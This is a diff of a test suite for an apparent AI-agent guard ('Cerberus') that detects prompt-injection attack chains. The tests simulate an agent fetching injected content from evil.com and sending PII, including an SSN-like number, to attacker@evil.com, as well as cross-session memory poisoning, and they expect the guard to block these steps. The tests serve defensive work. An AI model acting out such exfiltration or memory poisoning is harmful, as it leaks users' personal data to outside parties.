@@ -97,17 +97,18 @@ describe('guard', () => {
     const fetchResult = await result.executors.fetchExternalContent({ url: 'https://evil.com' });
     expect(fetchResult).toBe('<html>injected</html>');
 
-    // Step 3: Send outbound report with PII (L3 triggers, score per-turn = 1)
+    // Step 3: Send outbound report with PII (L3 triggers)
     const sendResult = await result.executors.sendOutboundReport({
       recipient: 'attacker@evil.com',
       body: 'alice@example.com 123-45-6789',
     });
 
-    // Per-turn score is 1 (only L3 in the send turn), threshold=3
-    // So it is NOT blocked at threshold=3
-    expect(sendResult).toBe('sent');
+    // Session-cumulative: L1 + L2 + L3 = score 3, threshold=3 → interrupt
+    expect(sendResult).toContain('[Cerberus]');
+    expect(sendResult).toContain('blocked');
     expect(result.assessments).toHaveLength(3);
-    expect(result.assessments[2].vector.l3).toBe(true);
+    expect(result.assessments[2].vector).toEqual({ l1: true, l2: true, l3: true, l4: false });
+    expect(result.assessments[2].score).toBe(3);
   });
 
   it('should block with low threshold', async () => {
@@ -289,18 +290,14 @@ describe('guard — L4 memory tracking', () => {
       memoryTools: MEMORY_TOOLS,
     });
 
-    // Simulate Session A contamination by directly writing to the graph
-    // (In production, this would be a previous guard() instance sharing the same DB)
-    result.graph!.writeNode({
-      nodeId: 'secret',
-      trustLevel: 'untrusted',
-      sourceSessionId: 'previous-session',
-      source: 'fetchExternalContent',
-      contentHash: 'aabbccdd',
-      timestamp: 1000,
-    });
+    // Session A: contaminate memory via untrusted write
+    await result.executors.writeMemory({ key: 'secret', value: 'injected payload' });
+    expect(result.graph!.size()).toBe(1);
 
-    // Current session reads the contaminated node → should trigger L4
+    // reset() rotates sessionId → simulates new session
+    result.reset();
+
+    // Session B: read the contaminated node → should trigger L4
     await result.executors.readMemory({ key: 'secret' });
 
     expect(result.assessments).toHaveLength(1);
